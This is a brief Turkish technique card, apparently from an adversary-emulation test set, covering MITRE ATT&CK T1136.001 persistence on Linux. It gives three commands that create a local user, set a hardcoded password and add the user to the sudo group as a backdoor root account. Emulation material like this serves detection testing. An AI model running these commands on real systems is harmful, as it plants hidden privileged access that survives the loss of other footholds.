# Linux Yerel Kullanıcı Oluşturma ve Yetkilendirme (Persistence - T1136.001)
Hedef Linux sistem üzerinde kalıcılık elde etmek amacıyla sisteme yeni bir yerel kullanıcı eklenir ve bu kullanıcı sudo grubuna dahil edilerek en yüksek yetkilerle donatılır. Bu sayede saldırgan, mevcut erişim kanallarını kaybetse bile bu yetkili hesap üzerinden sisteme tekrar giriş yapabilir.

## Uygulama
Terminal üzerinden sırasıyla şu komutlar çalıştırılarak süreç simüle edilir:


# 1. 'test_user1' adında yeni bir kullanıcı oluştur ve ev dizini tanımla.
```cmd
sudo useradd -m -s /bin/bash test_user1
```
# 2. Oluşturulan kullanıcıya güçlü bir şifre ata.
```cmd
echo "test_user1:Password123!" | sudo chpasswd
```
# 3. Kullanıcıyı 'sudo' grubuna ekleyerek root yetkileri ver.
```cmd
sudo usermod -aG sudo test_user1
```